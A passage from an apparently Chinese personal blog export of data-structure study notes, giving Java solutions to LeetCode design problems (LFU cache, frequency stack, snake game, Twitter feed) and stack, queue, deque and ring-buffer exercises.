&#125;&#125;\n\n\n\n\n\nLFU 缓存淘汰算法\n  LFU 按照访问频率进行淘汰元素，并且如果出现频率相同多个元素，则优先淘汰最旧的数据。\n  leetcode-460 LFU 缓存 hard\n\n条件分析\n  关键需满足的条件如下：\n\n1、使用一个 HashMap存储 key 到 val 的映射，就可以快速计算 get(key)。  2、使用一个 HashMap 存储 key 到 freq 的映射，就可以快速操作 key 对应的 freq 。  3.1、首先，肯定是需要 freq 到 key 的映射，用来找到 freq 最小的 key。\n3.2、将 freq 最小的 key 删除，那你就得快速得到当前所有 key 最小的 freq 是多少。想要时间复杂度 O(1) 的话，肯定不能遍历一遍去找，那就用一个变量 minFreq 来记录当前最小的 freq 吧。\n3.3、可能有多个 key 拥有相同的 freq，所以 freq 对 key 是一对多的关系，即一个 freq 对应一个 key 的列表。\n3.4、希望 freq 对应的 key 的列表是存在时序的，便于快速查找并删除最旧的 key。\n3.5、希望能够快速删除 key 列表中的任何一个 key，因为如果频次为 freq 的某个 key 被访问，那么它的频次就会变成 freq+1，就应该从 freq 对应的 key 列表中删除，加到 freq+1 对应的 key 的列表中。\n\n  这里对于 freq 映射到的 key 列表，可以利用 LinkedHashSet 来维护，其中的链表可以帮助我们保持时序且快速删除和添加，而哈希集合可以快速查找元素\n\n代码实现\n\n\nJava code\n  package top.john.base;import java.util.HashMap;import java.util.LinkedHashSet;public class LFUCache &#123;    // key =&gt; val    HashMap&lt;Integer, Integer&gt; keyToVal;    // key =&gt; freq    HashMap&lt;Integer, Integer&gt; keyToFreq;    // freq =&gt; keyList    HashMap&lt;Integer, LinkedHashSet&lt;Integer&gt;&gt; freqToKeys;    // 记录最小的频次    int minFreq;    // 记录 LFU 缓存的最大容量    int cap;    public LFUCache(int capacity) &#123;        keyToVal = new HashMap&lt;&gt;();        keyToFreq = new HashMap&lt;&gt;();        freqToKeys = new HashMap&lt;&gt;();        this.cap = capacity;        this.minFreq = 0;    &#125;    public int get(int key) &#123;        // TODO        if (!keyToFreq.containsKey(key)) &#123;            return -1;        &#125;        int val = keyToVal.get(key);        increaseFreq(key);        return val;    &#125;    public void put(int key, int val) &#123;        // TODO        if (keyToVal.containsKey(key)) &#123;            keyToVal.put(key, val);            increaseFreq(key);            return;        &#125;        if (cap &lt;= keyToVal.size()) &#123;            removeMinFreqKey();        &#125;        keyToVal.put(key, val);        keyToFreq.put(key, 1);        freqToKeys.putIfAbsent(1, new LinkedHashSet&lt;&gt;());        freqToKeys.get(1).add(key);        // 注意修改 minFreq        this.minFreq = 1;    &#125;    public void increaseFreq(int key) &#123;        // TODO        Integer freq = keyToFreq.get(key);        // 更新 KF 表        keyToFreq.put(key, freq + 1);        // 更新 FK 表        // 1.1 删除原 freq 中的 key        freqToKeys.get(freq).remove(key);        // 1.2 更新 key 到 freq + 1 中        freqToKeys.putIfAbsent(freq + 1, new LinkedHashSet&lt;&gt;());        freqToKeys.get(freq + 1).add(key);        // 1.3 对原 freq 的 keyList 进行维护        if (freqToKeys.get(freq).isEmpty()) &#123;            freqToKeys.remove(freq);            if (this.minFreq == freq) &#123;                this.minFreq++;            &#125;        &#125;    &#125;    public void removeMinFreqKey() &#123;        // TODO        LinkedHashSet&lt;Integer&gt; keys = freqToKeys.get(this.minFreq);        Integer delKey = keys.iterator().next();        // 从 keysList 中删除        keys.remove(delKey);        // 如果 keysList 为空了，则没有对应这个 freq 的元素了        if (keys.isEmpty()) &#123;            freqToKeys.remove(this.minFreq);            // 不需要更新 minFreq 的值，这个 API 只会在 put 新的 key 时会调用            // 出现新的 key 必然会更新 minFreq        &#125;        // 从 KV 表中删除        keyToVal.remove(delKey);        // 从 KF 表中删除        keyToFreq.remove(delKey);    &#125;&#125;\n\n\n\n\n\n最大栈\n  leetcode-895 最大频率栈 hard\n  类似前面的题目，我们仍要维护一个频率到元素的映射，并记录频率最大值\n  这里有个细节就是当 push 一个已存在频率映射中的元素时，只修改 valToFreq 原有映射，并添加 freqToVals 一个新的映射集即可，而之前的保留。这里的区别在于即使后面 pop 元素时，其频率是会降低但不会没有，而且每次只会降低1个频率，因此之前的频率映射集仍要保留\n  class FreqStack &#123;    // 记录 FreqStack 中元素的最大频率    int maxFreq = 0;    // 记录 FreqStack 中每个 val 对于的出现频率    HashMap&lt;Integer, Integer&gt; valToFreq;        HashMap&lt;Integer, Stack&lt;Integer&gt;&gt; freqToVals;    public FreqStack() &#123;        valToFreq = new HashMap&lt;&gt;();        freqToVals = new HashMap&lt;&gt;();    &#125;        public void push(int val) &#123;        int freq = valToFreq.getOrDefault(val, 0) + 1;        valToFreq.put(val, freq);        freqToVals.putIfAbsent(freq, new Stack&lt;&gt;());        freqToVals.get(freq).push(val);        this.maxFreq = Math.max(this.maxFreq, freq);    &#125;        public int pop() &#123;        Stack&lt;Integer&gt; freqs = freqToVals.get(this.maxFreq);        int res = freqs.pop();        int f = valToFreq.get(res) - 1;        valToFreq.put(res, f);        if (freqs.isEmpty()) &#123;            freqToVals.remove(this.maxFreq);            this.maxFreq--;        &#125;        return res;    &#125;&#125;\n\n设计类题目\n\nleettcode-353 贪吃蛇\n这里利用链表来记录蛇身的每个位置，利用哈希集合来快速判断新移动位置是否会和之前的位置发生碰撞。\nclass SnakeGame &#123;    // 记录蛇身位置，主要找蛇头和蛇尾    LinkedList&lt;Integer&gt; body;    // 记录蛇身位置的集合，便于快速判断    HashSet&lt;Integer&gt; set;    // food 出现的位置序列    LinkedList&lt;Integer&gt; food;    // 判断是否存活    boolean isAlive;    // 屏幕尺寸    int m, n;    public SnakeGame(int width, int height, int[][] food) &#123;        this.m = height;        this.n = width;        this.isAlive = true;        this.body = new LinkedList&lt;&gt;();        this.set = new HashSet&lt;&gt;();        this.food = new LinkedList&lt;&gt;();                for (int[] p : food) &#123;            this.food.add(encode(p[0], p[1]));        &#125;        // 添加蛇头起始点        this.body.addLast(encode(0,0));        this.set.add(encode(0,0));    &#125;        public int move(String direction) &#123;        if (!isAlive) &#123;            return -1;        &#125;        // 拿到原蛇头的位置        int head = this.body.getFirst();        // 转换成二维坐标        int x = head / n, y = head % n;        // 新坐标        int nx = x, ny = y;        switch(direction) &#123;            case &quot;R&quot;:                ny++;                break;            case &quot;D&quot;:                nx++;                break;            case &quot;U&quot;:                nx--;                break;            case &quot;L&quot;:                ny--;                break;        &#125;        // 判断越界        if (nx &lt; 0 || nx == m || ny &lt; 0 || ny == n ) &#123;            isAlive = false;            return -1;        &#125;        // 编码新坐标        int code = encode(nx, ny);               // 判断吃没吃着食物        if (!food.isEmpty() &amp;&amp; food.getFirst() == code) &#123;            // 身长 + 1 =&gt; 尾巴不会消失            food.removeFirst();        &#125; else &#123;            int tail = body.removeLast();            set.remove(tail);        &#125;         // 判断吃没吃着自己，注意是在吃饭食物后判断，因为尾部会有变化        if (set.contains(code)) &#123;            isAlive = false;            return -1;        &#125;                // 添加新头部        body.addFirst(code);        set.add(code);        // 分数等于身长 -1        return body.size() - 1;    &#125;    // 将二维坐标编码成一维    private int encode(int x, int y) &#123;        return x * n + y;    &#125;&#125;/** * Your SnakeGame object will be instantiated and called as such: * SnakeGame obj = new SnakeGame(width, height, food); * int param_1 = obj.move(direction); */\n\nleetcode-355 设计推特\n  想法：userId 和 关注+自己的id 映射；维护一个 LinkedList\n  class Twitter &#123;    class Node &#123;        int userId;        int tweetId;        public Node(int userId, int tweetId) &#123;            this.userId = userId;            this.tweetId = tweetId;        &#125;    &#125;    LinkedList&lt;Node&gt; news;    HashMap&lt;Integer, HashSet&lt;Integer&gt;&gt; userToUsers;    public Twitter() &#123;        this.news = new LinkedList&lt;&gt;();        this.userToUsers = new HashMap&lt;&gt;();    &#125;        public void postTweet(int userId, int tweetId) &#123;        Node x = new Node(userId, tweetId);        news.addFirst(x);    &#125;        public List&lt;Integer&gt; getNewsFeed(int userId) &#123;        int count = 10;        LinkedList&lt;Integer&gt; res = new LinkedList&lt;&gt;();        Iterator list = news.iterator();        while (count &gt; 0 &amp;&amp; list.hasNext()) &#123;            Node x = (Node) list.next();            if (x.userId == userId || (this.userToUsers.containsKey(userId) &amp;&amp;                 this.userToUsers.get(userId).contains(x.userId))) &#123;                res.add(x.tweetId);                count--;            &#125;        &#125;        return res;    &#125;        public void follow(int followerId, int followeeId) &#123;        this.userToUsers.putIfAbsent(followerId, new HashSet&lt;&gt;());        this.userToUsers.get(followerId).add(followeeId);    &#125;        public void unfollow(int followerId, int followeeId) &#123;        if (this.userToUsers.containsKey(followerId)) &#123;            this.userToUsers.get(followerId).remove(followeeId);        &#125;    &#125;&#125;\n  作者提供的一个更加聪明的设计，结合了合并 k 个有序链表的算法思路，以及 OOP 思想\n\nJava Code\n  // Tweet structureclass Tweet &#123;    private int id;    private int time;    private Tweet next;    // 需要传入推文内容（id）和发文时间    public Tweet(int id, int time) &#123;        this.id = id;        this.time = time;        this.next = null;    &#125;&#125;// User Structure// static int timestamp = 0class User &#123;    private int id;    public Set&lt;Integer&gt; followed;    // 用户发表的推文链表头结点    public Tweet head;    public User(int userId) &#123;        followed = new HashSet&lt;&gt;();        this.id = userId;        this.head = null;        // 关注一下自己        follow(id);    &#125;    public void follow(int userId) &#123;        followed.add(userId);    &#125;    public void unfollow(int userId) &#123;        // 不可以取关自己        if (userId != this.id)            followed.remove(userId);    &#125;    public void post(int tweetId) &#123;        Tweet twt = new Tweet(tweetId, timestamp);        timestamp++;        // 将新建的推文插入链表头        // 越靠前的推文 time 值越大        twt.next = head;        head = twt;    &#125;&#125;class Twitter &#123;    private static int timestamp = 0;    private static class Tweet &#123;...&#125;    private static class User &#123;...&#125;    // 我们需要一个映射将 userId 和 User 对象对应起来    private HashMap&lt;Integer, User&gt; userMap = new HashMap&lt;&gt;();    /** user 发表一条 tweet 动态 */    public void postTweet(int userId, int tweetId) &#123;        // 若 userId 不存在，则新建        if (!userMap.containsKey(userId))            userMap.put(userId, new User(userId));        User u = userMap.get(userId);        u.post(tweetId);    &#125;        /** follower 关注 followee */    public void follow(int followerId, int followeeId) &#123;        // 若 follower 不存在，则新建\t\tif(!userMap.containsKey(followerId))&#123;\t\t\tUser u = new User(followerId);\t\t\tuserMap.put(followerId, u);\t\t&#125;        // 若 followee 不存在，则新建\t\tif(!userMap.containsKey(followeeId))&#123;\t\t\tUser u = new User(followeeId);\t\t\tuserMap.put(followeeId, u);\t\t&#125;\t\tuserMap.get(followerId).follow(followeeId);    &#125;        /** follower 取关 followee，如果 Id 不存在则什么都不做 */    public void unfollow(int followerId, int followeeId) &#123;        if (userMap.containsKey(followerId)) &#123;            User flwer = userMap.get(followerId);            flwer.unfollow(followeeId);        &#125;    &#125;    /** 返回该 user 关注的人（包括他自己）最近的动态 id，    最多 10 条，而且这些动态必须按从新到旧的时间线顺序排列。*/    public List&lt;Integer&gt; getNewsFeed(int userId) &#123;        // 合并 k 个有序链表的思路，利用优先级队列\t\t\t\tList&lt;Integer&gt; res = new ArrayList&lt;&gt;();        if (!userMap.containsKey(userId)) return res;        // 关注列表的用户 Id        Set&lt;Integer&gt; users = userMap.get(userId).followed;        // 自动通过 time 属性从大到小排序，容量为 users 的大小        PriorityQueue&lt;Tweet&gt; pq =             new PriorityQueue&lt;&gt;(users.size(), (a, b)-&gt;(b.time - a.time));        // 先将所有链表头节点插入优先级队列        for (int id : users) &#123;            Tweet twt = userMap.get(id).head;\t\t\t\t\t\t\t// 有的零推文发送要考虑！            if (twt == null) continue;            pq.add(twt);        &#125;        while (!pq.isEmpty()) &#123;            // 最多返回 10 条就够了            if (res.size() == 10) break;            // 弹出 time 值最大的（最近发表的）            Tweet twt = pq.poll();            res.add(twt.id);            // 将下一篇 Tweet 插入进行排序            if (twt.next != null)                 pq.add(twt.next);        &#125;        return res;    &#125;&#125;\n\n\n\nleetcode-379 电话目录管理系统\n  哈希集合存储已分配的号码方便快速查询；链表来存储未分配号码，先入先出\n  class PhoneDirectory &#123;    HashSet&lt;Integer&gt; finished;    LinkedList&lt;Integer&gt; unfinished;    public PhoneDirectory(int maxNumbers) &#123;        this.finished = new HashSet&lt;&gt;();        this.unfinished = new LinkedList&lt;&gt;();        for (int i = 0; i &lt; maxNumbers; i ++) &#123;            this.unfinished.addLast(i);        &#125;    &#125;        public int get() &#123;        if (this.unfinished.isEmpty()) &#123;            return -1;        &#125;        int res = this.unfinished.removeFirst();        this.finished.add(res);        return res;    &#125;        public boolean check(int number) &#123;        return !this.finished.contains(number);    &#125;        public void release(int number) &#123;           if (this.finished.contains(number)) &#123;            this.finished.remove(number);            this.unfinished.addLast(number);        &#125;    &#125;&#125;\n\nleetcode-155 最小栈\n  剑指 Offer 30. 包含min函数的栈\n\nleetcode-284 顶端迭代器\n  前置：leetcode-251 展开二维向量\n  这里实际按照二维数组遍历的方法即可，只不过每次保留 i 和 j 的值，同时要考虑到这一行为空数组的情况（如果遇到了就直接跳过）\n  class Vector2D &#123;    private int[][] vec;    private int i, j;    public Vector2D(int[][] vec) &#123;        this.vec = vec;        this.i = 0;        this.j = 0;    &#125;        public int next() &#123;        if (!hasNext()) &#123;            return -1;        &#125;        int res = vec[this.i][this.j];        this.j++;        return res;    &#125;        public boolean hasNext() &#123;        // 可能存在空数组行         while (this.i &lt; this.vec.length &amp;&amp; this.j == this.vec[i].length) &#123;            this.j = 0;            this.i++;        &#125;        if (this.i == this.vec.length) &#123;            return false;        &#125;        return true;    &#125;&#125;\n  因此对于顶端迭代器这道题，实际我也可以提前拿到下一个元素的值，然后作为一个成员变量时常更新即可\n  class PeekingIterator implements Iterator&lt;Integer&gt; &#123;\tprivate Iterator&lt;Integer&gt; iterator;\tprivate Integer nextElm;\tpublic PeekingIterator(Iterator&lt;Integer&gt; iterator) &#123;\t    // initialize any member here.\t    this.iterator = iterator;\t\tthis.nextElm = this.iterator.next();\t&#125;\t    // Returns the next element in the iteration without advancing the iterator.\tpublic Integer peek() &#123;        return this.nextElm;\t&#125;\t\t// hasNext() and next() should behave the same as in the Iterator interface.\t// Override them if needed.\t@Override\tpublic Integer next() &#123;\t\tint res = this.nextElm;\t    if (this.iterator.hasNext()) &#123;\t\t\tthis.nextElm = this.iterator.next();\t\t&#125; else &#123;\t\t\tthis.nextElm = null;\t\t&#125;\t\treturn res;\t&#125;\t\t@Override\tpublic boolean hasNext() &#123;\t\treturn !(nextElm == null);\t&#125;&#125;\n\n\n\n","tags":["基础"]},{"title":"算法提升——栈和队列篇","url":"/2023/04/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%AF%87%2048420399d0014e07ac9760f1e579f6d8/","content":"\n基本原理\n\n用底层链表结构 LinkedList 实现栈结构\n public class MyLinkedStack&lt;E&gt; &#123;\t// 直接调用底层 api \tprivate MyLinkedList&lt;E&gt; list = new MyLinkedList&lt;&gt;();\t// 压栈\tpublic void push(E e) &#123;\t\tlist.addLast(e);\t&#125;\t// 弹栈\tpublic E pop() &#123;\t\treturn list.removeLast();\t\t&#125;\t// 查看栈顶元素\tpublic E peek() &#123;\t\treturn list.getLast();\t&#125;&#125;\n\n构建双端队列 Deque \n \n 💡 特点：在队列头尾均可增删元素\n 底层如果用的链表也可以直接复用\n \n\n 底层使用数组的实现，如何高效使用？⇒ 环形数组\n 通过新增两个索引指针 first 和 last ；注意 last 指针指向最后一个元素的后边，first 指针指向第一个元素，即左闭右开区间\n\n 我们可以将其看作环，当 first 指针在第一个元素时想要扩容，可以跳至尾部继续添加元素；直至 first 和 last 指向一样且数组中元素已满时再扩容\n private void resize(int newCap) &#123;\tE[] temp = (E[]) new Object[newCap];\tfor (int i = 0; i &lt; size; i++) &#123;\t\ttemp[i] = data[(first + i) % data.length];\t&#125;\tfirst = 0;\tlast = size;\tdata = temp;&#125;public void addFirst(E e) &#123;\t// 扩容\tif (size == data.length) &#123;\t\tresize(2 * data.length);\t&#125;\t\tif (first == 0) &#123;\t\tfirst = data.length - 1;\t&#125; else &#123;\t\tfirst--;\t&#125;\t// 插入数据\tdata[first] = e;\t\tsize++;\t&#125;public void addLast(E e) &#123;\tif (size == data.length) &#123;\t\tresize(2 * data.length);\t&#125;\t\tdata[last] = e;\tlast++;\tif (last == data.length) &#123;\t\tlast = 0;\t&#125;\t\t\tsize++;&#125;public E removeFirst() &#123;\tif (isEmpty()) &#123;\t\tthrow new NoSuchElementException();\t&#125;\t// 缩容\tif (size == data.length / 4) &#123;\t\tresize(data.length / 2);\t&#125;\t\tE oldVal = data[first];\tdata[first] = null;\tfirst++;\tif (first == data.length) &#123;\t\tfirst = 0;\t&#125;\t\tsize--;\treturn oldVal;&#125;public E removeLast() &#123;\tif (isEmpty()) &#123;\t\tthrow new NoSuchElementException();\t&#125;\t// 缩容\tif (size == data.length / 4) &#123;\t\tresize(data.length / 2);\t&#125;\t\tif (last == 0) &#123;\t\tlast = data.length - 1;\t&#125; else &#123;\t\t\tlast--;\t\t\t&#125;\t\tE oldVal = data[last];\tdata[last] = null;\tsize--;\treturn oldVal;&#125;public E getFirst() &#123;\tif (isEmpty()) &#123;\t\tthrow new NoSuchElementException();\t&#125;\treturn data[first];&#125;public E getLast() &#123;\tif (isEmpty()) &#123;\t\tthrow new NoSuchElementException();\t&#125;\tif (last == 0) &#123;\t\treturn data[data.length - 1];\t&#125;\treturn data[last - 1];&#125;\n\nRingBuffer 结构\n\nAPI\n// 从 RingBuffer 中读取元素到 out 中，返回读取的字节数public int read(byte[] out);// 将 in 中的数据写入 RingBuffer, 返回写入的字节个数public int write(byte[] in);\n\n工作原理\n  r 和 w 指针就类似前面提到的 first 和 last 指针\n  read 方法实际就是 removeFirst()\n  write 方法实际就是 addLast() \n  buffer 数组维护的实际就是一个先进先出的队列\n\n  public RingBuffer(int cap) &#123;\t// 输入的 cap 变成 2 的指数\tcap = ceilToPowerOfTwo(cap);\t\t// (i + n) % capacity &lt;=&gt; (i + n) &amp; mask\t\tmask = cap - 1;\tbuffer = new byte[cap];\t\tr = w = 0;\t\tsize = 0;&#125;private static int ceilToPowerOfTwo(int n) &#123;\tif (n &lt; 0) &#123;\t\tn = 2;\t&#125;\t\tif (n &gt; (1 &lt;&lt; 30)) &#123;\t\tn = 1 &lt;&lt; 30;\t&#125;\tn--;\tn |= n &gt;&gt; 1;\tn |= n &gt;&gt; 2;\tn |= n &gt;&gt; 4;\tn |= n &gt;&gt; 8;\tn |= n &gt;&gt; 16;\tn++;\treturn n;&#125;private void resize(int newCap) &#123;\tnewCap = ceilToPowerOfTwo(newCap);\t\tbyte[] temp = new byte[newCap];\t// 将 data 中的数据读入\tint n = read(temp);\t\tthis.buffer = temp;\tthis.r = 0;\t// 指向下一个元素\tthis.w = n;\tthis.mask = newCap - 1;&#125;public int write(byte[] in) &#123;\tif (in == null || in.length == 0) &#123;\t\treturn 0;\t&#125;\tfinal int n = in.length;\t// 还有多少空间\tint free = buffer.length - size;\tif (n &gt; free) &#123;\t// 扩容\t\tresize(size + n);\t&#125;\t// 1. r ----- w\tif (w &gt;= r) &#123;\t\t\tif (w + n &lt;= buffer.length)&#123;\t\t\t// 1.1 r --- **w\t\t\tSystem.arraycopy(in, 0, buffer, w, n);\t\t&#125; else &#123;\t\t\t// 1.2 **w r--**\t\t\t\tint n1 = buffer.length - w;\t\t\tint n2 = n - n1;\t\t\tSystem.arraycopy(in, 0, buffer, w, n1);\t\t\tSystem.arraycopy(in, 0, buffer, 0, n2);\t\t&#125;\t\t&#125; else &#123;\t\t// 2. --w  r -- \t\t// buffer 空间足够，可直接写入\t\tSystem.arraycopy(in, 0, buffer, w, n);\t&#125;\t\t\t// w 指针前移\t\tw = (w + n) &amp; mask;\t\t// 可读的增加了 n 个字节\t\tsize += n;\t\treturn n;\t&#125;&#125;public int read(byte[] out) &#123;\tif (out == null || out.length == 0 || isEmpty()) &#123;\t\treturn 0;\t&#125;\tint n = Math.min(size, out.length);\t// 1. r ----- w\tif (r &lt; w) &#123;\t\t// ***r--w\t\tSystem.arraycopy(buffer, r, out, 0, n);\t\tr += n;\t\tsize -= n;\t\treturn n;\t&#125;\t// 2 --w r -- \tif (r + n &lt;= buffer.length) &#123;\t\t// 2.1 --w **r--\t\tSystem.arraycopy(buffer, r, out, 0, n);\t&#125; else &#123;\t\t// 2.2 **r--w ***\t\tint n1 = buffer.length - r;\t\tint n2 = n - n1;\t\tSystem.arraycopy(buffer, r, out, 0, n1);\t\tSystem.arraycopy(buffer, 0, out, n1, n2);\t&#125;\t// r 前移\tr = (r+n) &amp; mask;\tsize -= n;\treturn n;&#125;\n  PS: mask 使用技巧\n\n\n\n\n\n\n栈的经典习题\n\n👊leetcode-143 重排链表\n  这道题目的是重构链表使之变成首尾交替链接，栈的结构就是可以构成一个逆序的链表节点。这里的难点在于处理最后节点，避免出现环路的情况。需要特别判断 next 指针和 temp 指针的指向关系\n  public void reorderList(ListNode head) &#123;        // 维护一个栈结构        Stack&lt;ListNode&gt; stack = new Stack&lt;&gt;();        ListNode p = head;        while (p != null) &#123;            stack.push(p);            p = p.next;        &#125;        p = head;        while (p != null) &#123;            ListNode temp = stack.pop();            ListNode next = p.next;            // 考虑终止条件 =&gt; 分别对于偶数和奇数节点的情况            if (next == temp || temp.next == next) &#123;                temp.next = null;                break;            &#125;            p.next = temp;            temp.next = next;            //             p = next;        &#125;    &#125;\n\nleetcode-20 有效的括号\n  这个就是最基本的栈匹配问题，考虑一下栈中只有一个元素的特殊情况即可\n  class Solution &#123;    public boolean isValid(String s) &#123;        Stack&lt;Character&gt; stack = new Stack&lt;&gt;();        for (char c : s.toCharArray()) &#123;            if (c == &#x27;&#123;&#x27; || c == &#x27;[&#x27; || c == &#x27;(&#x27;) &#123;                stack.push(c);            &#125; else &#123;                if (!stack.isEmpty() &amp;&amp; getPair(stack.peek()) == c) &#123;                    stack.pop();                &#125; else &#123;                    return false;                &#125;            &#125;        &#125;        return stack.isEmpty() ? true : false;    &#125;    private char getPair(char c) &#123;        if (c == &#x27;&#123;&#x27;) &#123;            return &#x27;&#125;&#x27;;        &#125; else if (c == &#x27;[&#x27;) &#123;            return &#x27;]&#x27;;        &#125; else if (c == &#x27;(&#x27;) &#123;            return &#x27;)&#x27;;        &#125;        return &#x27;1&#x27;;    &#125;&#125;\n\nleetcode-150 逆波兰表达式求值\n  就是后缀表达式求值，编译原理课上也讲过具体的计算方法。通过维护一个栈，遇见操作数就弹栈并计算求和再压栈；遇见立即数就压栈\n  public int evalRPN(String[] tokens) &#123;        Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();        for (String token : tokens) &#123;            if (&quot;+-*/&quot;.contains(token)) &#123;                // 注意立即数的顺序                int num1 = stack.pop();                int num2 = stack.pop();                switch (token) &#123;                    case &quot;+&quot;: stack.push(num1 + num2);                              break;                    case &quot;-&quot;: stack.push(num2 - num1);                              break;                    case &quot;*&quot;: stack.push(num2 * num1);                              break;                    case &quot;/&quot;: stack.push(num2 / num1);                              break;                &#125;             &#125; else &#123;                stack.push(Integer.parseInt(token));            &#125;        &#125;        return stack.pop();    &#125;\n\nleetcode-225 用队列实现栈\n  Java 提供了 Queue 接口可以作为底层数据结构，我们可以用 LinkedList 作为其实现类。即然要保证先入后出，那么我们每次就要记录栈顶的值，即队尾的值。在弹栈时，不停的出队直至栈顶元素在队列的队头为止。注意如果栈中元素超过1个时，我们还要记录下一个栈顶元素，因此在出队时还需要标记当前栈顶元素的前一个元素，方便下一次弹栈操作。\n  class MyStack &#123;    private Queue&lt;Integer&gt; queue;        // 记录队尾元素，下一次弹栈用    private int tail = 0;    public MyStack() &#123;        queue = new LinkedList&lt;&gt;();    &#125;        public void push(int x) &#123;        queue.offer(x);        tail = x;    &#125;        public int pop() &#123;        int size = queue.size();        while (size &gt; 2) &#123;            queue.offer(queue.poll());            size--;        &#125;        // 下一次的栈顶        tail = queue.peek();        queue.offer(queue.poll());        return queue.poll();    &#125;        public int top() &#123;        return tail;    &#125;        public boolean empty() &#123;        return queue.isEmpty();    &#125;&#125;\n\nleetcode-155 最小栈\n  这题采取「空间换时间」策略，即维护另一栈用于存储对于当前栈顶元素而言到栈底的最小值，只需要在每次压栈的时候判断一下和当前最小栈栈顶元素大小关系即可。\n  class MinStack &#123;    private Stack&lt;Integer&gt; stack;    private Stack&lt;Integer&gt; miniStack;    public MinStack() &#123;        stack = new Stack&lt;&gt;();        miniStack = new Stack&lt;&gt;();    &#125;           public void push(int val) &#123;        stack.push(val);        if (miniStack.isEmpty() || val &lt;= miniStack.peek()) &#123;            // 当前元素较小            miniStack.push(val);        &#125; else &#123;            // 最小栈中元素最小            miniStack.push(miniStack.peek());        &#125;    &#125;        public void pop() &#123;        stack.pop();        miniStack.pop();    &#125;        public int top() &#123;        return stack.peek();    &#125;        public int getMin() &#123;        return miniStack.peek();    &#125;&#125;\n\n\n\n队列的经典习题\n\nleetcode-362 敲击计数器\n  这里有个要求就是只记录最近 300s 的敲击次数，那么在返回值时如果队头元素时间戳超过了 300s 就直接出队忽略\n  class HitCounter &#123;    private Queue&lt;Integer&gt; queue;    public HitCounter() &#123;        queue = new LinkedList&lt;&gt;();    &#125;        public void hit(int timestamp) &#123;        queue.offer(timestamp);    &#125;    public int getHits(int timestamp) &#123;        while (!queue.isEmpty() &amp;&amp; timestamp - queue.peek() &gt;= 300) &#123;            // 仅记录最近 300s 的            queue.poll();        &#125;                return queue.size();    &#125;&#125;\n\nleetcode-933 最近的请求次数\n  和上面这道题思想一样\n  class RecentCounter &#123;    private Queue&lt;Integer&gt; queque;    public RecentCounter() &#123;        queque = new LinkedList&lt;&gt;();    &#125;        public int ping(int t) &#123;        while (!queque.isEmpty() &amp;&amp; t - queque.peek() &gt; 3000) &#123;            queque.poll();        &#125;        queque.offer(t);        return queque.size();    &#125;&#125;\n\nleetcode-346 数据流中的移动平均值\n  这题刚开始写的很复杂，计算平均值都是先把多余的出队，实际上只用判断是否等于指定 size 就行，因为每次只会添加一个元素，所以如果超过了就出队一个。然后同时在已维护的队列元素总和上减去出队的元素值即可。\n  class MovingAverage &#123;    private Queue&lt;Integer&gt; queue;    private int size;    private int queueSum = 0;    public MovingAverage(int size) &#123;        queue = new LinkedList&lt;&gt;();        this.size = size;    &#125;        public double next(int val) &#123;        if (this.size == queue.size()) &#123;            int del = queue.poll();            queueSum -= del;        &#125;        queue.offer(val);        queueSum += val;        return queueSum * (1.0) / queue.size();    &#125;&#125;\n\nleetcode-622 设计循环队列\n  这里采用数组作底层结构，注意 head 和 tail 的临界条件即可\n  class MyCircularQueue &#123;    private int[] data;    private int size;    private int head;    private int tail;    public MyCircularQueue(int k) &#123;        data = new int[k];        size = 0;        head = tail = 0;    &#125;        public boolean enQueue(int value) &#123;        if (isFull()) &#123;            return false;        &#125;        if (tail == data.length) &#123;            tail = 0;            data[tail] = value;        &#125;        data[tail] = value;        tail++;        size++;        return true;    &#125;        public boolean deQueue() &#123;        if (isEmpty()) &#123;            return false;        &#125;        data[head] = 0;        if (head == data.length - 1) &#123;            head = 0;        &#125; else &#123;            head++;        &#125;        size--;        return true;    &#125;        public int Front() &#123;        return isEmpty() ? -1 : data[head];    &#125;        public int Rear() &#123;        if (isEmpty()) &#123;            return -1;        &#125;        if (tail == 0) &#123;            return data[data.length - 1];        &#125;        return data[tail - 1];    &#125;        public boolean isEmpty() &#123;        return size == 0;    &#125;        public boolean isFull() &#123;        return size == data.length;    &#125;&#125;\n\nleetcode-641 设计循环双端队列\n  跟循环队列差不多\n  class MyCircularDeque &#123;    private int[] data;    private int size;    private int head;    private int tail;    public MyCircularDeque(int k) &#123;        data = new int[k];        size = 0;        head = tail = 0;    &#125;        public boolean insertFront(int value) &#123;        if (isFull()) &#123;            return false;        &#125;        if (head == 0) &#123;            head = data.length - 1;                    &#125; else &#123;            head--;        &#125;        data[head] = value;        size++;        return true;    &#125;        public boolean insertLast(int value) &#123;        if (isFull()) &#123;            return false;        &#125;        if (tail == data.length) &#123;            tail = 0;        &#125;        data[tail] = value;        tail++;        size++;        return true;    &#125;        public boolean deleteFront() &#123;        if (isEmpty()) &#123;            return false;        &#125;        data[head] = 0;        if (head == data.length - 1) &#123;            head = 0;        &#125; else &#123;            head++;        &#125;        size--;        return true;    &#125;        public boolean deleteLast() &#123;        if (isEmpty()) &#123;            return false;        &#125;        if (tail == 0) &#123;            tail = data.length;        &#125;        data[tail- 1] = 0;        tail--;        size--;        return true;    &#125;        public int getFront() &#123;        return isEmpty() ? -1 : data[head];    &#125;        public int getRear() &#123;        if (isEmpty()) &#123;            return -1;        &#125;         if (tail == 0) &#123;            return data[data.length - 1];        &#125;         return data[tail - 1];    &#125;        public boolean isEmpty() &#123;        return size == 0;    &#125;        public boolean isFull() &#123;        return size == data.length;    &#125;&#125;\n\nleetcode-1670 设计前中后队列\n  这道题的难点在于从中间入队和出队，因此一个解决办法是将队列拆成两个左右列表。他们需要满足下列性质：\n  1、如果有偶数个元素时，pushMiddle 优先向右边添加\n  2、如果有奇数个元素时，popMiddle 优先从右边删除\n  3、如果只有 1 个元素，popFront 的时候，要去右边删除\n  这个可以通过例子推断出来，每次都保证右边列表最多比左列表多一个元素。\n  class FrontMiddleBackQueue &#123;    private LinkedList&lt;Integer&gt; left;    private LinkedList&lt;Integer&gt; right;    public FrontMiddleBackQueue() &#123;        left = new LinkedList&lt;&gt;();        right = new LinkedList&lt;&gt;();    &#125;       private void balance() &#123;        // 维护左列表和右列表的性质        // 右边只能比左边多一个        if (right.size() &gt; left.size() + 1) &#123;            left.addLast(right.removeFirst());        &#125; else if (right.size() &lt; left.size()) &#123;            right.addFirst(left.removeLast());        &#125;    &#125;        public void pushFront(int val) &#123;        left.addFirst(val);        balance();    &#125;        public void pushMiddle(int val) &#123;        if (size() % 2 == 0) &#123;       